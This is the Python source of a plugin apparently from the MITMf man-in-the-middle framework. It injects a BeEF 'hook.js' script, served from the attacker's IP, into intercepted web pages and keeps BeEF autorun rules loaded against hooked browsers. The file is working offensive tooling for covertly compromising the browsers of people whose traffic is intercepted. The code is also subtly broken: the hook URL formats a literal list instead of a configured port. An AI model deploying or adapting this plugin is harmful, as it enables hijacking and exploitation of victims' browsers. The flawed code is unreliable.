#!/usr/bin/env python2.7

# Copyright (c) 2014-2016 Marcello Salvati
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License as
# published by the Free Software Foundation; either version 3 of the
# License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful, but
# WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the GNU
# General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 59 Temple Place, Suite 330, Boston, MA 02111-1307
# USA
#
import os

from plugins.plugin import Plugin
from plugins.inject import Inject
from core.beefapi import BeefAPI
from mitmflib.watchdog.observers import Observer
from mitmflib.watchdog.events import FileSystemEventHandler

class BeefAutorun(Inject, Plugin):
    name     = "BeEFAutoloader"
    optname  = "beefauto"
    desc     = "Injects BeEF hooks & manages BeEF's ARE rule loading"
    version  = "0.4"

    def initialize(self, options):
        self.options    = options
        self.ip_address = options.ip
        beefconfig = self.config['MITMf']['BeEF']

        Inject.initialize(self, options)
        self.js_url = 'http://{}:{}/hook.js'.format(options.ip , ['port'])

        beefconfig = self.config['MITMf']['BeEF']

        from core.utils import shutdown
        beef = BeefAPI({"host": beefconfig['host'], "port": beefconfig['port']})
        if not beef.login(beefconfig['user'], beefconfig['pass']):
            shutdown("[BeEFAutorun] Error logging in to BeEF!")

        self.tree_info.append('Starting RuleWatcher')
        RuleWatcher(beef, self.log).start()

    def options(self, options):
        pass

class RuleWatcher(FileSystemEventHandler):

    def __init__(self, beef, logger):
        FileSystemEventHandler.__init__(self)
        self.beef = beef
        self.log  = logger

    def on_modified(self, event):
        self.log.debug('Detected ARE rule change!')
        for rule in self.beef.are_rules.list():
            self.log.debug('Deleting rule id: {} name: {}'.format(rule.id, rule.name))
            rule.delete()

        if event.src_path.endswith('.json'):
            self.log.debug('Detected ARE rule modification/addition!')
            for rule in os.listdir('./config/beef_arerules/enabled'):
                if rule.endswith('.json'):
                    rule_path = './config/beef_arerules/enabled/' + rule
                    self.log.debug('Adding rule {}'.format(rule_path))
                    self.beef.are_rules.add(rule_path)

    def start(self):
        observer = Observer()
        observer.schedule(self, path='./config/beef_arerules/enabled', recursive=False)
        observer.start()